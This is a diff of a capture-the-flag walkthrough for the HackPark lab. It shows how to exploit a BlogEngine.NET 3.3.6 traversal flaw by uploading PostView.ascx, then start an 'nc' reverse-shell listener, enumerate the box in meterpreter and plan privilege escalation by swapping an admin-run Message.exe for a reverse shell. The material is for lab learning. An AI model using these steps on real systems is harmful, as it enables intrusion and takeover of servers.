@@ -187,15 +187,30 @@ Get the CVE:
 With possible exploit [BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution](https://www.exploit-db.com/exploits/46353)
 
 1. Download and modify the IP and port values in the script.
+
+| ![Exploit script](../../_static/images/screenshot-46353.png)
+|:--:|
+| Change IP address to the IP address of the attack machine, and port to listening port (4442) |
+
 2. Save and rename script to `PostView.ascx`
 3. Go to posts (`http://IP address target machine/admin/#/content/posts`) and click on "Welcome to HackPark" to edit it.
+
+| ![Edit button](../../_static/images/screenshot-edit.png)
+|:--:|
+| There it is |
+
 4. On the edit bar on top of the post, click on the "File Manager" icon.
+
+| ![File manager button](../../_static/images/screenshot-file-manager.png)
+|:--:|
+| Not easy to find |
+
 5. Click on the "+ UPLOAD" button and upload the `PostView.ascx` script
 6. Close the file manager and click on "Save"
-7. Start a listener
+7. Start a listener with the port as entered in the script
 
 ```text
-# rlwrap nc -nlvp 442
+# rlwrap nc -nlvp 4442
 ```
 
 8. Go to `http://IP address target machine/?theme=../../App_Data/files`
@@ -253,28 +268,162 @@ Get detailed information about the Windows system:
 
 ```text
 meterpreter > sysinfo
+Computer        : HACKPARK
+OS              : Windows 2012 R2 (6.3 Build 9600).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
 ```
+
+Processes:
 
 ```text
 meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User              Path
+ ---   ----  ----                  ----  -------  ----              ----
+ 0     0     [System Process]
+ 4     0     System
+ 68    676   svchost.exe
+ 352   676   svchost.exe
+ 368   4     smss.exe
+ 524   516   csrss.exe
+ 576   568   csrss.exe
+ 584   516   wininit.exe
+ 612   568   winlogon.exe
+ 676   584   services.exe
+ 684   584   lsass.exe
+ 748   676   svchost.exe
+ 792   676   svchost.exe
+ 832   1404  revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
+ 876   612   dwm.exe
+ 884   676   svchost.exe
+ 912   676   svchost.exe
+ 964   676   svchost.exe
+ 1148  676   spoolsv.exe
+ 1176  676   amazon-ssm-agent.exe
+ 1252  676   svchost.exe
+ 1284  676   LiteAgent.exe
+ 1356  676   svchost.exe
+ 1372  676   svchost.exe
+ 1404  2952  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
+ 1432  676   WService.exe
+ 1560  1432  WScheduler.exe
+ 1652  676   Ec2Config.exe
+ 1784  748   WmiPrvSE.exe
+ 2028  676   svchost.exe
+ 2300  2388  Message.exe
+ 2340  1404  conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
+ 2388  3068  WScheduler.exe
+ 2488  912   taskhostex.exe
+ 2564  2556  explorer.exe
+ 2600  676   msdtc.exe
+ 2952  1372  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
+ 3016  2516  ServerManager.exe
 ```
+
+Program files:
 
 ```text
 meterpreter > cd "c:\program files (x86)"
 meterpreter > ls
+Listing: c:\program files (x86)
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Common Files
+040777/rwxrwxrwx  4096  dir   2014-03-21 19:07:01 +0000  Internet Explorer
+040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Microsoft.NET
+040777/rwxrwxrwx  8192  dir   2019-08-04 12:37:02 +0100  SystemScheduler
+040777/rwxrwxrwx  0     dir   2019-08-06 22:12:04 +0100  Uninstall Information
+040777/rwxrwxrwx  0     dir   2013-08-22 16:39:33 +0100  Windows Mail
+040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  Windows NT
+040777/rwxrwxrwx  0     dir   2013-08-22 16:39:30 +0100  WindowsPowerShell
+100666/rw-rw-rw-  174   fil   2013-08-22 16:37:57 +0100  desktop.ini
 ```
+
+Ah. SystemScheduler:
 
 ```text
 meterpreter > cd SystemScheduler
 meterpreter > ls
+Listing: c:\program files (x86)\SystemScheduler
+===============================================
+
+Mode              Size     Type  Last modified              Name
+----              ----     ----  -------------              ----
+040777/rwxrwxrwx  4096     dir   2022-09-30 19:49:34 +0100  Events
+100666/rw-rw-rw-  60       fil   2019-08-04 12:36:42 +0100  Forum.url
+100666/rw-rw-rw-  9813     fil   2004-11-16 07:16:34 +0000  License.txt
+100666/rw-rw-rw-  1496     fil   2022-09-30 18:48:54 +0100  LogFile.txt
+100666/rw-rw-rw-  3760     fil   2022-09-30 18:49:25 +0100  LogfileAdvanced.txt
+100777/rwxrwxrwx  536992   fil   2018-03-25 18:58:56 +0100  Message.exe
+100777/rwxrwxrwx  445344   fil   2018-03-25 18:59:00 +0100  PlaySound.exe
+100777/rwxrwxrwx  27040    fil   2018-03-25 18:58:58 +0100  PlayWAV.exe
+100666/rw-rw-rw-  149      fil   2019-08-04 23:05:19 +0100  Preferences.ini
+100777/rwxrwxrwx  485792   fil   2018-03-25 18:58:58 +0100  Privilege.exe
+100666/rw-rw-rw-  10100    fil   2018-03-24 19:09:04 +0000  ReadMe.txt
+100777/rwxrwxrwx  112544   fil   2018-03-25 18:58:58 +0100  RunNow.exe
+100777/rwxrwxrwx  235936   fil   2018-03-25 18:58:56 +0100  SSAdmin.exe
+100777/rwxrwxrwx  731552   fil   2018-03-25 18:58:56 +0100  SSCmd.exe
+100777/rwxrwxrwx  456608   fil   2018-03-25 18:58:58 +0100  SSMail.exe
+100777/rwxrwxrwx  1633696  fil   2018-03-25 18:58:52 +0100  Scheduler.exe
+100777/rwxrwxrwx  491936   fil   2018-03-25 18:59:00 +0100  SendKeysHelper.exe
+100777/rwxrwxrwx  437664   fil   2018-03-25 18:58:56 +0100  ShowXY.exe
+100777/rwxrwxrwx  439712   fil   2018-03-25 18:58:56 +0100  ShutdownGUI.exe
+100666/rw-rw-rw-  785042   fil   2006-05-17 00:49:52 +0100  WSCHEDULER.CHM
+100666/rw-rw-rw-  703081   fil   2006-05-17 00:58:18 +0100  WSCHEDULER.HLP
+100777/rwxrwxrwx  136096   fil   2018-03-25 18:58:58 +0100  WSCtrl.exe
+100777/rwxrwxrwx  68512    fil   2018-03-25 18:58:54 +0100  WSLogon.exe
+100666/rw-rw-rw-  33184    fil   2018-03-25 18:59:00 +0100  WSProc.dll
+100666/rw-rw-rw-  2026     fil   2006-05-16 23:58:18 +0100  WScheduler.cnt
+100777/rwxrwxrwx  331168   fil   2018-03-25 18:58:52 +0100  WScheduler.exe
+100777/rwxrwxrwx  98720    fil   2018-03-25 18:58:54 +0100  WService.exe
+100666/rw-rw-rw-  54       fil   2019-08-04 12:36:42 +0100  Website.url
+100777/rwxrwxrwx  76704    fil   2018-03-25 18:58:58 +0100  WhoAmI.exe
+100666/rw-rw-rw-  1150     fil   2007-05-17 21:47:02 +0100  alarmclock.ico
+100666/rw-rw-rw-  766      fil   2003-08-31 20:06:08 +0100  clock.ico
+100666/rw-rw-rw-  80856    fil   2003-08-31 20:06:10 +0100  ding.wav
+100666/rw-rw-rw-  1637972  fil   2009-01-09 03:21:48 +0000  libeay32.dll
+100777/rwxrwxrwx  40352    fil   2018-03-25 18:59:00 +0100  sc32.exe
+100666/rw-rw-rw-  766      fil   2003-08-31 20:06:26 +0100  schedule.ico
+100666/rw-rw-rw-  355446   fil   2009-01-09 03:12:34 +0000  ssleay32.dll
+100666/rw-rw-rw-  6999     fil   2019-08-04 12:36:42 +0100  unins000.dat
+100777/rwxrwxrwx  722597   fil   2019-08-04 12:36:32 +0100  unins000.exe
+100666/rw-rw-rw-  6574     fil   2009-06-27 01:27:32 +0100  whiteclock.ico
 ```
+
+Events:
 
 ```text
 meterpreter > cd events
 meterpreter > ls
+Listing: c:\program files (x86)\SystemScheduler\events
+======================================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100666/rw-rw-rw-  1926   fil   2022-09-30 19:50:01 +0100  20198415519.INI
+100666/rw-rw-rw-  26066  fil   2022-09-30 19:50:01 +0100  20198415519.INI_LOG.txt
+100666/rw-rw-rw-  290    fil   2020-10-02 22:50:12 +0100  2020102145012.INI
+100666/rw-rw-rw-  186    fil   2022-09-30 19:40:50 +0100  Administrator.flg
+100666/rw-rw-rw-  182    fil   2022-09-30 19:40:48 +0100  SYSTEM_svc.flg
+100666/rw-rw-rw-  0      fil   2022-09-30 18:49:25 +0100  Scheduler.flg
+100666/rw-rw-rw-  449    fil   2022-09-30 19:40:50 +0100  SessionInfo.flg
+100666/rw-rw-rw-  57     fil   2022-09-30 19:50:32 +0100  Update.flg
+100666/rw-rw-rw-  0      fil   2022-09-30 19:41:10 +0100  service.flg
+
+meterpreter >
 ```
 
-Replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell.
+We have an executable called `Message.exe` being executed (every 30 minutes) by administrator in a directory that has 
+Everyone `WriteData/CreateFiles` permissions. Replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell.
 
 Create the payload:
 
